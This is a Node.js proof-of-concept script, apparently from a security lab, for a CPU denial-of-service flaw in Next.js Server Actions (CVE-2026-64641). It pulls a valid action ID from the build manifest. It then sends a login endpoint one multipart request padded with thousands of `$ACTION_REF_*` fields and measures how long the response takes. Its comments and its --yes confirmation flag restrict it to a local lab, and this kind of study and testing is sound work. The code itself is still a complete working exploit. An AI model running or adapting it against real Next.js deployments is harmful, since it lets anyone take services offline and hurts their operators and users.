#!/usr/bin/env node
/**
 * LAB ONLY - CVE-2026-64641 (Server Actions CPU denial of service).
 *
 * Next.js 15.5.15 MPA-action validation calls FormData.getAll() once per
 * `$ACTION_REF_*` field, scanning the whole multipart body each time. A request
 * with many `$ACTION_REF_*` fields therefore becomes O(n^2). The fix (15.5.21)
 * rejects payloads with more than two `$ACTION_REF_*` fields.
 *
 * This script sends one request and reports its latency. Run only against the
 * local lab, never against a shared or public deployment.
 *
 * Usage: node lab/64641-dos.mjs [n] [--yes]
 *   n defaults to 20000. N > 5000 requires --yes.
 */
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, resolve } from 'node:path';

const here = dirname(fileURLToPath(import.meta.url));
const manifestPath = resolve(here, '../frontend/.next/server/server-reference-manifest.json');
const FE = process.env.FE_BASE_URL || 'http://127.0.0.1:3000';

const n = Number(process.argv[2] || 20000);
const confirmed = process.argv.includes('--yes');

if (!Number.isInteger(n) || n < 1) { console.error('n phải là số nguyên dương'); process.exit(1); }
if (n > 5000 && !confirmed) {
  console.error(`n=${n} có thể làm chậm máy. Thêm --yes nếu chắc chắn chạy trên local.`);
  process.exit(1);
}

let manifest;
try { manifest = JSON.parse(readFileSync(manifestPath, 'utf8')); }
catch (e) {
  console.error(`Không đọc được ${manifestPath}. Chạy "cd frontend && npm run build:study" trước.`);
  console.error(String(e));
  process.exit(1);
}
const actionId = Object.keys(manifest.node || {}).find(k => k.length === 42);
if (!actionId) { console.error('Không tìm thấy action ID 42 ký tự trong manifest.'); process.exit(1); }
const descriptor = `{"id":"${actionId}"}`;

console.log(`Target: ${FE}/login`);
console.log(`Action ID hợp lệ: ${actionId}`);
console.log(`Số field $ACTION_REF_*: ${n} (+ ${n} descriptor) -> ${2 * n} multipart fields`);

const fd = new FormData();
// Put all refs first so every getAll() descriptor scan walks past the refs too.
for (let i = 0; i < n; i++) fd.append(`$ACTION_REF_${i}`, '');
for (let i = 0; i < n; i++) fd.append(`$ACTION_${i}:0`, descriptor);
fd.append('email', 'lab@example.com');
fd.append('password', 'x');

const started = performance.now();
let status = 0, size = 0;
try {
  const res = await fetch(`${FE}/login`, { method: 'POST', body: fd, signal: AbortSignal.timeout(180000) });
  status = res.status;
  size = (await res.text()).length;
} catch (e) {
  console.error('Request lỗi/timeout:', String(e));
}
const ms = Math.round(performance.now() - started);
console.log(`Kết quả: status=${status}, ${ms} ms, response ${size} bytes`);
console.log('\nSo sánh: chạy lại với n nhỏ hơn (ví dụ 1000) để thấy thời gian tăng phi tuyến.');
console.log('Trong lúc request đang chạy, thử mở trang khác: nếu bị treo, đó là CPU DoS.');
